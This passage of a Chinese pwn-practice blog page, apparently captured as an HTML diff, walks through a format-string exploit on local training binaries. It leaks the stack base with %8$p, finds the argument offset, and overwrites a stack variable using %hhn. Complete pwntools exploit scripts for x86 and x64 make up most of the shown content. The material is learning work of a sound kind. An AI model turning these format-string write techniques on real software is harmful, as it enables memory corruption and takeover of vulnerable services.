+</span></span></code></pre></div><p>第8个偏移就是栈底了也就是<code>%8$p</code></p>
+<p>然后是确定test3的栈地址。<br>
+先查看是什么汇编</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x56556291 &lt;dofunc+87&gt;    cmp    dword ptr [ebp - 0x10], 0x64
+</span></span></code></pre></div><p>是<code>ebp-0x10</code>就是test的栈偏移了，哪就可以用上面得到栈ebp的地址0x10得到test3的偏移，通过%n写入100即可完成。</p>
+<p>如何计算出%n的偏移？</p>
+<blockquote>
+<p>可以通过aaaa%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+看0x61616161再哪出现，第几个就是多少偏移。</p>
+</blockquote>
+<h3 id="exp">EXP<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;fmt_test_2_x86&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raw_input()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvline(<span style="color:#e6db74">&#34;input:&#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;%8$p&#34;</span>)
+</span></span><span style="display:flex;"><span>ebp_addr <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">10</span>],<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(ebp_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#r.recvline(&#34;input:&#34;)</span>
+</span></span><span style="display:flex;"><span>test3_addr <span style="color:#f92672">=</span> ebp_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(test3_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%96c</span><span style="color:#e6db74">%14$hhn&#34;</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;ebp_addr is:&#34;</span><span style="color:#f92672">+</span>hex(ebp_addr))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;test3_addr is:&#34;</span><span style="color:#f92672">+</span>hex(test3_addr))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive() 
+</span></span></code></pre></div><h3 id="x64exp">x64EXP<a hidden class="anchor" aria-hidden="true" href="#x64exp">#</a></h3>
+<p>x64需要注意</p>
+<ul>
+<li>算上寄存器的空间</li>
+<li>地址写在后面</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;fmt_test_2_x64&#34;</span>)
+</span></span><span style="display:flex;"><span>raw_input()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvline(<span style="color:#e6db74">&#34;input:&#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;%9$p&#34;</span>)
+</span></span><span style="display:flex;"><span>ebp_addr <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">14</span>],<span style="color:#ae81ff">16</span>) 
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;ebp_addr is:&#34;</span>,hex(ebp_addr))
+</span></span><span style="display:flex;"><span>test3_addr <span style="color:#f92672">=</span> ebp_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;test3_addr is:&#34;</span>,hex(test3_addr))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvline(<span style="color:#e6db74">&#34;input:&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%100c</span><span style="color:#e6db74">%12$hhnaaaa&#34;</span><span style="color:#f92672">+</span>p64(test3_addr)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+        </div>
+
+        <footer class="post-footer">
+            
+<nav class="paginav">
+  <a class="next" href="http://guozhi1.github.io/posts/pwn/rop%E4%B8%AD%E7%BA%A7/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>ROP中级</span>
+  </a>
+</nav>
+
+        </footer>
+    </div>
+
+<style>
+    .comments_details summary::marker {
+        font-size: 20px;
+        content: '👉展开评论';
+        color: var(--content);
+    }
+    .comments_details[open] summary::marker{
+        font-size: 20px;
+        content: '👇关闭评论';
+        color: var(--content);
+    }
+</style>
+
+
+<div>
+    <details class="comments_details">
+        <summary style="cursor: pointer; margin: 50px 0 20px 0;width: 130px;">
+            <span style="font-size: 20px;color: var(--content);">...</span>
+        </summary>
+        <div id="tcomment"></div>
+    </details>
+    <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js">
+    </script>
+    <script>
+        twikoo.init({
+            envId:  null ,
+        el: "#tcomment",
+            lang: 'zh-CN',
+            region:  null ,
+        path: window.TWIKOO_MAGIC_PATH||window.location.pathname,
+        })
+    </script>
+</div>
+</article>
+</main>
+
+<footer class="footer">
+    <span>
+        Copyright
+        &copy;
+        -2023
+        <a href="http://guozhi1.github.io" style="color:#939393;">果汁天下苏&#39;s Blog</a>
+        All Rights Reserved
+    </span>
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#939393;"></a>&nbsp;
+    <span>
+        <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null"
+           style="display:inline-block;text-decoration:none;height:20px;color:#939393;">
+            <img src="" style="float:left;margin: 0px 5px 0px 0px;"/>
+            
+        </a>
+    </span>
+    <span id="busuanzi_container">
+        <span class="fa fa-user"></span> <span id="busuanzi_value_site_uv"></span>
+        <span class="fa fa-eye"></span> <span id="busuanzi_value_site_pv"></span>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z"/>
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    document.addEventListener('scroll', function (e) {
+        const readProgress = document.getElementById("read_progress");
+        const scrollHeight = document.documentElement.scrollHeight;
+        const clientHeight = document.documentElement.clientHeight;
+        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+        readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
+    })
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    let mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        (function() {
+            document.cookie = "change-themes" + "="+ escape ("false");
+        })()
+
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script>
+
+<script>
+    document.body.addEventListener('copy', function (e) {
+        if (window.getSelection().toString() && window.getSelection().toString().length > 50) {
+            let clipboardData = e.clipboardData || window.clipboardData;
+            if (clipboardData) {
+                e.preventDefault();
+                let htmlData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"果汁天下苏's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                let textData = window.getSelection().toString() +
+                    '\r\n\n————————————————\r\n' +
+                    '版权声明：本文为「'+"果汁天下苏's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                clipboardData.setData('text/html', htmlData);
+                clipboardData.setData('text/plain', textData);
+            }
+        }
+    });
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerText = '📄复制';
+
+        function copyingDone() {
+            copybutton.innerText = '👌🏻已复制!';
+            setTimeout(() => {
+                copybutton.innerText = '📄复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                let text = codeblock.textContent +
+                    '\r\n————————————————\r\n' +
+                    '版权声明：本文为「'+"果汁天下苏's Blog"+'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
+                '\r\n原文链接：' + location.href;
+                navigator.clipboard.writeText(text);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) {}
+            selection.removeRange(range);
+        });
+
+        let language = codeblock.className.replaceAll("language-", "")
+        let macTool = document.createElement("div")
+        let macTool1 = document.createElement("div")
+        let macTool2 = document.createElement("div")
+        let macTool3 = document.createElement("div")
+        let languageType = document.createElement("div")
+        languageType.innerText = language
+        macTool.setAttribute('class', 'mac-tool')
+        macTool1.setAttribute('class', 'mac bb1')
+        macTool2.setAttribute('class', 'mac bb2')
+        macTool3.setAttribute('class', 'mac bb3')
+        languageType.setAttribute('class', 'language-type')
+        macTool.appendChild(macTool1)
+        macTool.appendChild(macTool2)
+        macTool.appendChild(macTool3)
+        macTool.appendChild(languageType)
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+            container.appendChild(macTool)
+        }
+    });
+</script>
+
+<script>
+    $("code[class^=language] ").on("mouseover", function () {
+        if (this.clientWidth < this.scrollWidth) {
+            $(this).css("width", "135%")
+            $(this).css("border-top-right-radius", "var(--radius)")
+        }
+    }).on("mouseout", function () {
+        $(this).css("width", "100%")
+        $(this).css("border-top-right-radius", "unset")
+    })
+</script>
+</body>
+
+</html>
